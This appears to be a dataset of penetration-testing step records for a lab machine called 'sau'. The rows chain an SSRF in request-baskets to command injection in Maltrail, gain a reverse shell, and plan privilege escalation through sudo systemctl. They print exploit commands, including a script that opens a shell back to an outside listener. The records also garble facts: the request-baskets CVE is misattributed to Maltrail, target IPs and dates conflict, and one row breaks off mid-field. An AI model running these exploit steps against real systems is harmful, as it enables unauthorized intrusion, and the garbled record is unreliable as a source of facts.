4. Therefore, the strategy to exploit the found vulnerability in 'request-baskets' version 1.2.1 is a logical next step. This strategy is based on the findings from the vulnerability analysis and aligns with the overall goal of the penetration testing process. The proof of concept available on GitHub (https://github.com/entr0pie/CVE-2023-27163/blob/main/CVE-2023-27163.sh) will be used to carry out the exploitation.",Exploit the selected exploitation,"1. In the previous steps of the penetration testing process, we have successfully identified a critical Server-Side Request Forgery (SSRF) vulnerability (CVE-2023-27163) in 'request-baskets' version 1.2.1. This discovery was the result of a thorough vulnerability analysis, which also revealed the method of exploitation and potential impacts of the vulnerability.

2. Given this information, the next logical step in the penetration testing process is to exploit the identified vulnerability. This is because exploiting the vulnerability can potentially allow us to gain unauthorized access or retrieve sensitive data from the system, furthering our understanding of the system's security weaknesses.

3. To carry out the exploitation, a proof of concept has been identified on GitHub (https://github.com/entr0pie/CVE-2023-27163/blob/main/CVE-2023-27163.sh). This proof of concept provides a practical guide on how to exploit the identified vulnerability, which can be invaluable in the penetration testing process.

4. Therefore, the selected step to exploit the identified vulnerability in 'request-baskets' version 1.2.1 using the provided proof of concept follows logically from the findings of the previous steps and aligns with the strategy of exploiting the found vulnerability. This step is a critical part of the penetration testing process and could potentially lead to significant discoveries about the system's security.","{'Metasploit': ""Exploit the SSRF vulnerability in 'request-baskets' version 1.2.1 using the identified proof of concept.""}"
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed)
       1.3.1:{Nmap version:7.80, Scan date and time:2024-01-04 10:26 EST, IP address scanned:10.10.11.224, Host status:Up, Latency:0.11s, Closed ports:65531, Scan duration:7.31 seconds}
       1.3.2 Determine the services and versions on each open port - (completed)
       1.3.2:{Open Ports and Services: Port 22/tcp: Open, Service: ssh, Port 55555/tcp: Open, Service: unknown, Filtered Ports and Services: Port 80/tcp: Filtered, Service: http, Port 8338/tcp: Filtered, Service: unknown} 
       1.3:{Target IP:10.129.229.26}
       1.3.3 Enumerate port 80 - (completed)
       1.3.3:{Port 80: Not loaded}
       1.3.4 Enumerate port 55555 - (completed)
       1.3.4:{Port 55555: Directs to a web page, Web page function: Collecting and inspecting HTTP requests, Web page URL: http://10.129.229.26:55555/, Action: Creating a basket to collect and inspect HTTP requests, Result of action: Returns a token for future basket access, Basket created: 'wygbo5a', Token received: fAyZqu93BRdiZ2UakGim_JbTk5rhtCrmUojTozkLjoNM}
       1.3.5 Further Enumerate the website - (completed)
       1.3.5:{Basket functionality: Collects HTTP requests, Basket status: Empty, Basket URL: http://10.129.229.26:55555/wygbo5a, GET request made to the basket, GET request time: 8:08:58 pm 02/08/2025, GET request endpoint: /wygbo5a, Headers of GET request: Accept: */*, User-Agent: curl/8.5.0, Powering service: request-baskets, Version: 1.2.1, Directories found with statuses, sizes: /baskets: Status 401, Size 0, /Documents and Settings: Status 400, Size 75, /lost+found: Status 400, Size 75, /Program Files: Status 400, Size 75, /reports list: Status 400, Size 75, /web: Status 200, Size 8700}
   1.4 Perform vulnerability analysis on 'request-baskets' version 1.2.1 - (completed)
   1.4:{Vulnerability identified: CVE-2023-27163, Vulnerability type: Server-Side Request Forgery (SSRF), Vulnerability severity: Critical, Vulnerable component: `/api/baskets/{name}` in Request-Baskets version 1.2.1, Vulnerability description: Allows attackers to make unauthorized requests to internal or external resources. It can lead to access to network resources, sensitive information, and exploitation of other vulnerabilities, Exploitation method: Involves creating a basket within Request-Baskets and manipulating the `forward_url` parameter to point to internal services or resources, Impact: Information Disclosure/Exfiltration: Retrieval of sensitive data from internal network resources, Unauthorized Access: Potential bypass of security measures to access resources, Further Attacks: SSRF vulnerability can be chained with other exploits for more severe outcomes, like Remote Code Execution (RCE), Service Disruption: Potential overload of the server leading to denial-of-service conditions, Mitigation: Update Request-Baskets to a version higher than 1.2.1, implement strong network security practices, and robust authentication mechanisms}
   1.5 Exploit the found exploitation - (completed)
   1.5:{Command executed: `sudo ./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80`, Purpose: Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163), More info URL: https://github.com/entr0pie/CVE-2023-27163, Action: Created a proxy basket ""qrylhr"", Result: Accessing http://10.129.229.26:55555/qrylhr makes the server request to http://127.0.0.1:80, Authorization token: QpN9Y1vLdotSZOPzt7P00SUDMvZngpKrBhJqlfdRJPOJ, Findings: Port 80 is powered by Maltrail (v0.53), Maltrail interface includes: Documentation, Wiki, Issues, Log In, Threats, Events, Severity, Sources, Trails, Maltrail version: v0.53}",Exploit the found exploitation,"1. In the previous steps of the penetration testing process, we have successfully identified a critical Server-Side Request Forgery (SSRF) vulnerability (CVE-2023-27163) in 'request-baskets' version 1.2.1. This discovery was the result of a thorough vulnerability analysis, which also revealed the method of exploitation and potential impacts of the vulnerability.

2. Given this information, the next logical step in the penetration testing process is to exploit the identified vulnerability. This is because exploiting the vulnerability can potentially allow us to gain unauthorized access or retrieve sensitive data from the system, furthering our understanding of the system's security weaknesses.

3. To carry out the exploitation, a proof of concept has been identified on GitHub (https://github.com/entr0pie/CVE-2023-27163/blob/main/CVE-2023-27163.sh). This proof of concept provides a practical guide on how to exploit the identified vulnerability, which can be invaluable in the penetration testing process.

4. Therefore, the selected step to exploit the identified vulnerability in 'request-baskets' version 1.2.1 using the provided proof of concept follows logically from the findings of the previous steps and aligns with the strategy of exploiting the found vulnerability. This step is a critical part of the penetration testing process and could potentially lead to significant discoveries about the system's security.","- Command executed: `sudo ./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80`
- Purpose: Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163)
- More info URL: https://github.com/entr0pie/CVE-2023-27163
- Action: Created a proxy basket ""qrylhr""
- Result: Accessing http://10.129.229.26:55555/qrylhr makes the server request to http://127.0.0.1:80
- Authorization token: QpN9Y1vLdotSZOPzt7P00SUDMvZngpKrBhJqlfdRJPOJ
- Findings: Port 80 is powered by Maltrail (v0.53)
- Maltrail interface includes: Documentation, Wiki, Issues, Log In, Threats, Events, Severity, Sources, Trails
- Maltrail version: v0.53",Do a vulnerability analysis on Maltrail (v0.53),"1. The intended task of the previous step was to exploit the identified vulnerability in 'request-baskets' version 1.2.1 using a provided proof of concept. This task was successfully achieved as evidenced by the creation of a proxy basket ""qrylhr"" that, when accessed, makes the server request to http://127.0.0.1:80. 

2. The key findings from this exploitation include the discovery that port 80 is powered by Maltrail (v0.53). This information is crucial as it gives us a new target for further penetration testing. 

3. Given the success of the previous step and the discovery of Maltrail (v0.53) on port 80, the next logical step is to perform a vulnerability analysis on Maltrail (v0.53). This is because knowing the software and its version can provide insights into potential vulnerabilities that can be exploited. The goal now is to identify vulnerabilities in Maltrail (v0.53) and find ways to exploit them, furthering our understanding of the system's security weaknesses.

4. Therefore, the strategy to perform a vulnerability analysis on Maltrail (v0.53) is a logical next step. This strategy is based on the findings from the previous steps and aligns with the overall goal of the penetration testing process. The goal now is to identify vulnerabilities in Maltrail (v0.53) and find ways to exploit them.",Do a google search for more information,"1. In the previous steps of the penetration testing process, we successfully exploited a vulnerability in 'request-baskets' version 1.2.1. This exploitation led to the discovery that port 80 is powered by Maltrail (v0.53), a new potential target for further testing.

2. Given this information, the next logical step in the penetration testing process is to perform a vulnerability analysis on Maltrail (v0.53). This involves identifying any known vulnerabilities in this version of the software and understanding how they can be exploited. This step is crucial for gaining a comprehensive understanding of the system's security weaknesses.

3. However, to perform a vulnerability analysis, we first need to gather more information about Maltrail (v0.53) and its known vulnerabilities. This is where the selected step comes in - doing a Google search. A Google search can provide a wealth of information, including details about known vulnerabilities, how they can be exploited, and potentially even proof-of-concept exploits.

4. Therefore, the selected step to do a Google search for more information on Maltrail (v0.53) and its vulnerabilities follows logically from the findings of the previous steps and aligns with the strategy of performing a vulnerability analysis on Maltrail (v0.53). This step is a critical precursor to the vulnerability analysis and could potentially lead to significant discoveries about the system's security.",{'Google search': 'Search for known vulnerabilities and exploits for Maltrail (v0.53)'}
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed)
       1.3.1:{Nmap version:7.80, Scan date and time:2024-01-04 10:26 EST, IP address scanned:10.10.11.224, Host status:Up, Latency:0.11s, Closed ports:65531, Scan duration:7.31 seconds}
       1.3.2 Determine the services and versions on each open port - (completed)
       1.3.2:{Open Ports and Services: Port 22/tcp: Open, Service: ssh, Port 55555/tcp: Open, Service: unknown, Filtered Ports and Services: Port 80/tcp: Filtered, Service: http, Port 8338/tcp: Filtered, Service: unknown} 
       1.3:{Target IP:10.129.229.26}
       1.3.3 Enumerate port 80 - (completed)
       1.3.3:{Port 80: Not loaded}
       1.3.4 Enumerate port 55555 - (completed)
       1.3.4:{Port 55555: Directs to a web page, Web page function: Collecting and inspecting HTTP requests, Web page URL: http://10.129.229.26:55555/, Action: Creating a basket to collect and inspect HTTP requests, Result of action: Returns a token for future basket access, Basket created: 'wygbo5a', Token received: fAyZqu93BRdiZ2UakGim_JbTk5rhtCrmUojTozkLjoNM}
       1.3.5 Further Enumerate the website - (completed)
       1.3.5:{Basket functionality: Collects HTTP requests, Basket status: Empty, Basket URL: http://10.129.229.26:55555/wygbo5a, GET request made to the basket, GET request time: 8:08:58 pm 02/08/2025, GET request endpoint: /wygbo5a, Headers of GET request: Accept: */*, User-Agent: curl/8.5.0, Powering service: request-baskets, Version: 1.2.1, Directories found with statuses, sizes: /baskets: Status 401, Size 0, /Documents and Settings: Status 400, Size 75, /lost+found: Status 400, Size 75, /Program Files: Status 400, Size 75, /reports list: Status 400, Size 75, /web: Status 200, Size 8700}
   1.4 Perform vulnerability analysis on 'request-baskets' version 1.2.1 - (completed)
   1.4:{Vulnerability identified: CVE-2023-27163, Vulnerability type: Server-Side Request Forgery (SSRF), Vulnerability severity: Critical, Vulnerable component: `/api/baskets/{name}` in Request-Baskets version 1.2.1, Vulnerability description: Allows attackers to make unauthorized requests to internal or external resources. It can lead to access to network resources, sensitive information, and exploitation of other vulnerabilities, Exploitation method: Involves creating a basket within Request-Baskets and manipulating the `forward_url` parameter to point to internal services or resources, Impact: Information Disclosure/Exfiltration: Retrieval of sensitive data from internal network resources, Unauthorized Access: Potential bypass of security measures to access resources, Further Attacks: SSRF vulnerability can be chained with other exploits for more severe outcomes, like Remote Code Execution (RCE), Service Disruption: Potential overload of the server leading to denial-of-service conditions, Mitigation: Update Request-Baskets to a version higher than 1.2.1, implement strong network security practices, and robust authentication mechanisms}
   1.5 Exploit the found exploitation - (completed)
   1.5:{Command executed: `sudo ./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80`, Purpose: Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163), More info URL: https://github.com/entr0pie/CVE-2023-27163, Action: Created a proxy basket ""qrylhr"", Result: Accessing http://10.129.229.26:55555/qrylhr makes the server request to http://127.0.0.1:80, Authorization token: QpN9Y1vLdotSZOPzt7P00SUDMvZngpKrBhJqlfdRJPOJ, Findings: Port 80 is powered by Maltrail (v0.53), Maltrail interface includes: Documentation, Wiki, Issues, Log In, Threats, Events, Severity, Sources, Trails, Maltrail version: v0.53}
   1.6 Perform vulnerability analysis on Maltrail (v0.53) - (completed)
   1.6:{Maltrail version: 0.53, Vulnerabilities identified: Unauthenticated Remote Code Execution (RCE) and Command Injection, Specific vulnerabilities: CVE-2023-27163: Allows for unauthenticated RCE. The exploit involves sending a crafted payload to the login endpoint of Maltrail, enabling arbitrary code execution on the target system without credentials. This could lead to gaining a shell on the victim machine, Unauthenticated Command Injection: Present in versions prior to 0.54, including 0.53. The vulnerability exists in the `params.get(""username"")` parameter within the `mailtrail/core/http.py` file. Attackers can inject arbitrary OS commands through the username parameter, which will be executed with the privileges of the running process. This has been successfully tested on Maltrail versions 0.52 and 0.53, Exploitation: Involves sending a specially crafted request to the Maltrail login endpoint to execute malicious commands or establish a reverse shell, Mitigation recommendation: Update Maltrail to a patched version as soon as possible to mitigate these risks.}",Do a vulnerability analysis on Maltrail (v0.53),"1. In the previous steps of the penetration testing process, we successfully exploited a vulnerability in 'request-baskets' version 1.2.1. This exploitation led to the discovery that port 80 is powered by Maltrail (v0.53), a new potential target for further testing.

2. Given this information, the next logical step in the penetration testing process is to perform a vulnerability analysis on Maltrail (v0.53). This involves identifying any known vulnerabilities in this version of the software and understanding how they can be exploited. This step is crucial for gaining a comprehensive understanding of the system's security weaknesses.

3. However, to perform a vulnerability analysis, we first need to gather more information about Maltrail (v0.53) and its known vulnerabilities. This is where the selected step comes in - doing a Google search. A Google search can provide a wealth of information, including details about known vulnerabilities, how they can be exploited, and potentially even proof-of-concept exploits.

4. Therefore, the selected step to do a Google search for more information on Maltrail (v0.53) and its vulnerabilities follows logically from the findings of the previous steps and aligns with the strategy of performing a vulnerability analysis on Maltrail (v0.53). This step is a critical precursor to the vulnerability analysis and could potentially lead to significant discoveries about the system's security.","- Maltrail version: 0.53
- Vulnerabilities identified: Unauthenticated Remote Code Execution (RCE) and Command Injection
- Specific vulnerabilities:
  - CVE-2023-27163: Allows for unauthenticated RCE. The exploit involves sending a crafted payload to the login endpoint of Maltrail, enabling arbitrary code execution on the target system without credentials. This could lead to gaining a shell on the victim machine.
  - Unauthenticated Command Injection: Present in versions prior to 0.54, including 0.53. The vulnerability exists in the `params.get(""username"")` parameter within the `mailtrail/core/http.py` file. Attackers can inject arbitrary OS commands through the username parameter, which will be executed with the privileges of the running process. This has been successfully tested on Maltrail versions 0.52 and 0.53.
- Exploitation: Involves sending a specially crafted request to the Maltrail login endpoint to execute malicious commands or establish a reverse shell.
- Mitigation recommendation: Update Maltrail to a patched version as soon as possible to mitigate these risks.",Exploit the selected exploitation,"1. The intended task of the previous step was to perform a vulnerability analysis on Maltrail (v0.53), which was successfully achieved. The analysis revealed two significant vulnerabilities, namely Unauthenticated Remote Code Execution (RCE) and Command Injection, both of which can be exploited to gain unauthorized access or execute arbitrary commands on the target system.

2. The key findings from this vulnerability analysis include the identification of the specific vulnerabilities and their exploitation methods. For instance, the Unauthenticated RCE vulnerability allows for arbitrary code execution on the target system without credentials by sending a crafted payload to the login endpoint of Maltrail. Similarly, the Unauthenticated Command Injection vulnerability allows attackers to inject arbitrary OS commands through the username parameter, which will be executed with the privileges of the running process.

3. Given the success of the previous step and the discovery of these vulnerabilities, the next logical step in the penetration testing process is to exploit these vulnerabilities. This aligns with the overall goal of the penetration testing process, which is to identify and exploit vulnerabilities in order to assess the security of the system.

4. Therefore, the strategy to exploit the identified vulnerabilities in Maltrail (v0.53) is a logical next step. This strategy is based on the findings from the previous steps and aligns with the overall goal of the penetration testing process. The goal now is to exploit these vulnerabilities and observe the results, which could potentially lead to gaining unauthorized access to the system or executing arbitrary commands.",Exploit the selected exploitation,"1. The previous steps in the penetration testing process have led us to the discovery of two significant vulnerabilities in Maltrail (v0.53), namely Unauthenticated Remote Code Execution (RCE) and Command Injection. These vulnerabilities can potentially be exploited to gain unauthorized access to the system or execute arbitrary commands.

2. Given this information, the next logical step in the penetration testing process is to exploit these identified vulnerabilities. This step is crucial as it allows us to test the system's security measures against actual exploitation attempts. It also gives us a chance to assess the potential impact and severity of these vulnerabilities, and to validate the effectiveness of the identified exploitation methods.

3. Therefore, the selected step to exploit the identified vulnerabilities aligns with the overall strategy of the penetration testing process. This step follows logically from the findings of the previous steps and is a critical part of the penetration testing process. It allows us to move from theoretical vulnerability analysis to practical exploitation, providing us with concrete evidence of the system's security weaknesses.

4. In conclusion, the selected step to exploit the identified vulnerabilities in Maltrail (v0.53) is a logical next step in the penetration testing process. This step will potentially lead to gaining unauthorized access to the system or executing arbitrary commands, thereby providing valuable insights into the system's security posture.",{'Metasploit': 'Exploit the Unauthenticated Remote Code Execution and Command Injection vulnerabilities in Maltrail (v0.53).'}
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed)
       1.3.1:{Nmap version:7.80, Scan date and time:2024-01-04 10:26 EST, IP address scanned:10.10.11.224, Host status:Up, Latency:0.11s, Closed ports:65531, Scan duration:7.31 seconds}
       1.3.2 Determine the services and versions on each open port - (completed)
       1.3.2:{Open Ports and Services: Port 22/tcp: Open, Service: ssh, Port 55555/tcp: Open, Service: unknown, Filtered Ports and Services: Port 80/tcp: Filtered, Service: http, Port 8338/tcp: Filtered, Service: unknown} 
       1.3:{Target IP:10.129.229.26}
       1.3.3 Enumerate port 80 - (completed)
       1.3.3:{Port 80: Not loaded}
       1.3.4 Enumerate port 55555 - (completed)
       1.3.4:{Port 55555: Directs to a web page, Web page function: Collecting and inspecting HTTP requests, Web page URL: http://10.129.229.26:55555/, Action: Creating a basket to collect and inspect HTTP requests, Result of action: Returns a token for future basket access, Basket created: 'wygbo5a', Token received: fAyZqu93BRdiZ2UakGim_JbTk5rhtCrmUojTozkLjoNM}
       1.3.5 Further Enumerate the website - (completed)
       1.3.5:{Basket functionality: Collects HTTP requests, Basket status: Empty, Basket URL: http://10.129.229.26:55555/wygbo5a, GET request made to the basket, GET request time: 8:08:58 pm 02/08/2025, GET request endpoint: /wygbo5a, Headers of GET request: Accept: */*, User-Agent: curl/8.5.0, Powering service: request-baskets, Version: 1.2.1, Directories found with statuses, sizes: /baskets: Status 401, Size 0, /Documents and Settings: Status 400, Size 75, /lost+found: Status 400, Size 75, /Program Files: Status 400, Size 75, /reports list: Status 400, Size 75, /web: Status 200, Size 8700}
   1.4 Perform vulnerability analysis on 'request-baskets' version 1.2.1 - (completed)
   1.4:{Vulnerability identified: CVE-2023-27163, Vulnerability type: Server-Side Request Forgery (SSRF), Vulnerability severity: Critical, Vulnerable component: `/api/baskets/{name}` in Request-Baskets version 1.2.1, Vulnerability description: Allows attackers to make unauthorized requests to internal or external resources. It can lead to access to network resources, sensitive information, and exploitation of other vulnerabilities, Exploitation method: Involves creating a basket within Request-Baskets and manipulating the `forward_url` parameter to point to internal services or resources, Impact: Information Disclosure/Exfiltration: Retrieval of sensitive data from internal network resources, Unauthorized Access: Potential bypass of security measures to access resources, Further Attacks: SSRF vulnerability can be chained with other exploits for more severe outcomes, like Remote Code Execution (RCE), Service Disruption: Potential overload of the server leading to denial-of-service conditions, Mitigation: Update Request-Baskets to a version higher than 1.2.1, implement strong network security practices, and robust authentication mechanisms}
   1.5 Exploit the found exploitation - (completed)
   1.5:{Command executed: `sudo ./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80`, Purpose: Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163), More info URL: https://github.com/entr0pie/CVE-2023-27163, Action: Created a proxy basket ""qrylhr"", Result: Accessing http://10.129.229.26:55555/qrylhr makes the server request to http://127.0.0.1:80, Authorization token: QpN9Y1vLdotSZOPzt7P00SUDMvZngpKrBhJqlfdRJPOJ, Findings: Port 80 is powered by Maltrail (v0.53), Maltrail interface includes: Documentation, Wiki, Issues, Log In, Threats, Events, Severity, Sources, Trails, Maltrail version: v0.53}
   1.6 Perform vulnerability analysis on Maltrail (v0.53) - (completed)
   1.6:{Maltrail version: 0.53, Vulnerabilities identified: Unauthenticated Remote Code Execution (RCE) and Command Injection, Specific vulnerabilities: CVE-2023-27163: Allows for unauthenticated RCE. The exploit involves sending a crafted payload to the login endpoint of Maltrail, enabling arbitrary code execution on the target system without credentials. This could lead to gaining a shell on the victim machine, Unauthenticated Command Injection: Present in versions prior to 0.54, including 0.53. The vulnerability exists in the `params.get(""username"")` parameter within the `mailtrail/core/http.py` file. Attackers can inject arbitrary OS commands through the username parameter, which will be executed with the privileges of the running process. This has been successfully tested on Maltrail versions 0.52 and 0.53, Exploitation: Involves sending a specially crafted request to the Maltrail login endpoint to execute malicious commands or establish a reverse shell, Mitigation recommendation: Update Maltrail to a patched version as soon as possible to mitigate these risks.}
   1.7 Exploit the selected exploitation - (completed)
   1.7:{Action: Modified the Proof-of-Concept (POC) for CVE-2023-27163 by removing /login on line 28, Command executed: `./cve-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:80/login`, Result: Created a proxy basket ""jgulua"". Accessing http://10.10.11.224:55555/jgulua now makes the server request to http://127.0.0.1:80/login, Authorization token: Je6HFdfIxVWIxmlDzyQWsTnB0uFGpdBAkOb8n3WniMGZ, Action: Ran the modified exploit script using command `python maltrail_rce. 10.10.16.163 443 http://10.129.229.26:55555/jgulua`, Observation: The script hangs, but a shell is received on a listening netcat (nc) at port 443, Shell details: Connection received on 10.10.11.224 46168, uid=1001(puma), gid=1001(puma), groups=1001(puma)}",Exploit the selected exploitation,"1. The previous steps in the penetration testing process have led us to the discovery of two significant vulnerabilities in Maltrail (v0.53), namely Unauthenticated Remote Code Execution (RCE) and Command Injection. These vulnerabilities can potentially be exploited to gain unauthorized access to the system or execute arbitrary commands.

2. Given this information, the next logical step in the penetration testing process is to exploit these identified vulnerabilities. This step is crucial as it allows us to test the system's security measures against actual exploitation attempts. It also gives us a chance to assess the potential impact and severity of these vulnerabilities, and to validate the effectiveness of the identified exploitation methods.

3. Therefore, the selected step to exploit the identified vulnerabilities aligns with the overall strategy of the penetration testing process. This step follows logically from the findings of the previous steps and is a critical part of the penetration testing process. It allows us to move from theoretical vulnerability analysis to practical exploitation, providing us with concrete evidence of the system's security weaknesses.

4. In conclusion, the selected step to exploit the identified vulnerabilities in Maltrail (v0.53) is a logical next step in the penetration testing process. This step will potentially lead to gaining unauthorized access to the system or executing arbitrary commands, thereby providing valuable insights into the system's security posture.","- Action: Modified the Proof-of-Concept (POC) for CVE-2023-27163 by removing /login on line 28.
- Command executed: `./cve-2023-27163.sh http://10.10.11.224:55555 http://127.0.0.1:80/login`
- Result: Created a proxy basket ""jgulua"". Accessing http://10.10.11.224:55555/jgulua now makes the server request to http://127.0.0.1:80/login.
- Authorization token: Je6HFdfIxVWIxmlDzyQWsTnB0uFGpdBAkOb8n3WniMGZ
- Action: Ran the modified exploit script using command `python maltrail_rce. 10.10.16.163 443 http://10.129.229.26:55555/jgulua`
- Observation: The script hangs, but a shell is received on a listening netcat (nc) at port 443.
- Shell details: Connection received on 10.10.11.224 46168, uid=1001(puma), gid=1001(puma), groups=1001(puma)",Enumerate to find more information to escalate the previledge,"1. The intended task of the previous step was to exploit the identified vulnerabilities in Maltrail (v0.53), which was successfully achieved. The exploitation resulted in gaining a reverse shell on the target system, which is a significant milestone in the penetration testing process.

2. The key finding from this step is that we now have a shell on the target system. This shell is running with the privileges of the user ""puma"", as indicated by the uid and gid in the shell details. However, this user may not have sufficient privileges to access all areas of the system or perform certain actions.

3. Given this, the next logical step in the penetration testing process is to try to escalate our privileges on the system. Privilege escalation involves finding and exploiting a flaw in the system that allows us to gain higher-level privileges, such as root or administrator access. This would give us full control over the system and allow us to access any data or perform any actions we want.

4. Therefore, the strategy to enumerate and find more information to escalate the privilege is a logical next step. This strategy follows logically from the findings of the previous steps and aligns with the overall goal of the penetration testing process, which is to gain as much control over the system as possible in order to fully assess its security.","Explore the suspicious files, commands and create a summary of the findings.","1. The previous step in the penetration testing process was successful in exploiting the identified vulnerabilities in Maltrail (v0.53), which resulted in gaining a reverse shell on the target system. This shell, however, is running under the user ""puma"", which might have limited privileges on the system.

2. Given this, the selected step to explore suspicious files, commands, and their privileges is a logical continuation of the process. This step aligns with the overall strategy to enumerate and find more information to escalate the privilege. By exploring the files and commands available to the current user, we can potentially identify insecure configurations, weak permissions, or other vulnerabilities that can be exploited for privilege escalation.

3. Furthermore, creating a summary of the findings is a critical part of this step. This summary can provide a comprehensive overview of the potential attack vectors available for privilege escalation. It can also help in planning the next steps of the penetration testing process, by identifying the most promising avenues for further exploration or exploitation.

4. Therefore, the selected step to explore suspicious files, commands, and their privileges and create a summary of the findings follows logically from the findings of the previous steps and aligns with the overall goal of the penetration testing process. This step moves us closer to the goal of gaining higher-level privileges on the system, thereby providing a more thorough assessment of the system's security posture.","{'Interactive CLI': ""Explore suspicious files and commands available to the user 'puma' and check their privileges."", 'Google search': 'Research potential vulnerabilities or exploits related to the findings.'}"
sau,"1. Reconnaissance - [completed]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - (completed)
       1.3.1:{Nmap version:7.80, Scan date and time:2024-01-04 10:26 EST, IP address scanned:10.10.11.224, Host status:Up, Latency:0.11s, Closed ports:65531, Scan duration:7.31 seconds}
       1.3.2 Determine the services and versions on each open port - (completed)
       1.3.2:{Open Ports and Services: Port 22/tcp: Open, Service: ssh, Port 55555/tcp: Open, Service: unknown, Filtered Ports and Services: Port 80/tcp: Filtered, Service: http, Port 8338/tcp: Filtered, Service: unknown} 
       1.3:{Target IP:10.129.229.26}
       1.3.3 Enumerate port 80 - (completed)
       1.3.3:{Port 80: Not loaded}
       1.3.4 Enumerate port 55555 - (completed)
       1.3.4:{Port 55555: Directs to a web page, Web page function: Collecting and inspecting HTTP requests, Web page URL: http://10.129.229.26:55555/, Action: Creating a basket to collect and inspect HTTP requests, Result of action: Returns a token for future basket access, Basket created: 'wygbo5a', Token received: fAyZqu93BRdiZ2UakGim_JbTk5rhtCrmUojTozkLjoNM}
       1.3.5 Further Enumerate the website - (completed)
       1.3.5:{Basket functionality: Collects HTTP requests, Basket status: Empty, Basket URL: http://10.129.229.26:55555/wygbo5a, GET request made to the basket, GET request time: 8:08:58 pm 02/08/2025, GET request endpoint: /wygbo5a, Headers of GET request: Accept: */*, User-Agent: curl/8.5.0, Powering service: request-baskets, Version: 1.2.1, Directories found with statuses, sizes: /baskets: Status 401, Size 0, /Documents and Settings: Status 400, Size 75, /lost+found: Status 400, Size 75, /Program Files: Status 400, Size 75, /reports list: Status 400, Size 75, /web: Status 200, Size 8700}
   1.4 Perform vulnerability analysis on 'request-baskets' version 1.2.1 - (completed)
   1.4:{Vulnerability identified: CVE-2023-27163, Vulnerability type: Server-Side Request Forgery (SSRF), Vulnerability severity: Critical, Vulnerable component: `/api/baskets/{name}` in Request-Baskets version 1.2.1, Vulnerability description: Allows attackers to make unauthorized requests to internal or external resources. It can lead to access to network resources, sensitive information, and exploitation of other vulnerabilities, Exploitation method: Involves creating a basket within Request-Baskets and manipulating the `forward_url` parameter to point to internal services or resources, Impact: Information Disclosure/Exfiltration: Retrieval of sensitive data from internal network resources, Unauthorized Access: Potential bypass of security measures to access resources, Further Attacks: SSRF vulnerability can be chained with other exploits for more severe outcomes, like Remote Code Execution (RCE), Service Disruption: Potential overload of the server leading to denial-of-service conditions, Mitigation: Update Request-Baskets to a version higher than 1.2.1, implement strong network security practices, and robust authentication mechanisms}
   1.5 Exploit the found exploitation - (completed)
   1.5:{Command executed: `sudo ./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80`, Purpose: Proof-of-Concept of SSRF on Request-Baskets (CVE-2023-27163), More info URL: https://github.com/entr0pie/CVE-2023-27163, Action: Created a proxy basket ""qrylhr"", Result: Accessing http://10.129.229.26:55555/qrylhr makes the server request to http://127.0.0.1:80, Authorization token: QpN9Y1vLdotSZOPzt7P00SUDMvZngpKrBhJqlfdRJPOJ, Findings: Port 80 is powered by Maltrail (v0.53), Maltrail interface includes: Documentation, Wiki, Issues, Log In, Threats, Events, Severity, Sources, Trails, Maltrail version: v0.53}
   1.6 Perform vulnerability analysis on Maltrail (v0.53) - (completed)
   1.6:{Maltrail version: 0.53, Vulnerabilities identified: Unauthenticated Remote Code Execution (RCE) and Command Injection, Specific vulnerabilities: CVE-2023-27163: Allows for unauthenticated RCE. The exploit involves sending a crafted payload to the login endpoint of Maltrail, enabling arbitrary code execution on the target system without credentials. This could lead to gaining a shell on the victim machine, Unauthenticated Command Injection: Present in versions prior to 0.54, including 0.53. The vulnerability exists in the `params.get(""username"")` parameter within the `mailtrail/core/http.py` file. Attackers can inject arbitrary OS commands through the username parameter, which will be executed with the privileges of the running process. This has been successfully tested on Maltrail versions 0.52 and 0.53, Exploitation: Involves sending a specially crafted request to the Maltrail login endpoint to",Enumerate to find more information to escalate the previledge,"1. The previous step in the penetration testing process was successful in exploiting the identified vulnerabilities in Maltrail (v0.53), which resulted in gaining a reverse shell on the target system. This shell, however, is running under the user ""puma"", which might have limited privileges on the system.

2. Given this, the selected step to explore suspicious files, commands, and their privileges is a logical continuation of the process. This step aligns with the overall strategy to enumerate and find more information to escalate the privilege. By exploring the files and commands available to the current user, we can potentially identify insecure configurations, weak permissions, or other vulnerabilities that can be exploited for privilege escalation.

3. Furthermore, creating a summary of the findings is a critical part of this step. This summary can provide a comprehensive overview of the potential attack vectors available for privilege escalation. It can also help in planning the next steps of the penetration testing process, by identifying the most promising avenues for further exploration or exploitation.

4. Therefore, the selected step to explore suspicious files, commands, and their privileges and create a summary of the findings follows logically from the findings of the previous steps and aligns with the overall goal of the penetration testing process. This step moves us closer to the goal of gaining higher-level privileges on the system, thereby providing a more thorough assessment of the system's security posture.","- User examined: puma
- Server: sau
- sudo privileges: puma user can run some systemctl commands as root without a password.
- Specific command puma can run without password: `/usr/bin/systemctl status trail.service`
- Matching Defaults entries for puma on sau: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin",Run the command /usr/bin/systemctl status trail.service,"1. The intended task of the previous step was to explore suspicious files, commands, and their privileges, which was successfully achieved. The exploitation resulted in gaining a reverse shell on the target system, and the user ""puma"" was found to have sudo privileges to run some systemctl commands as root without a password.

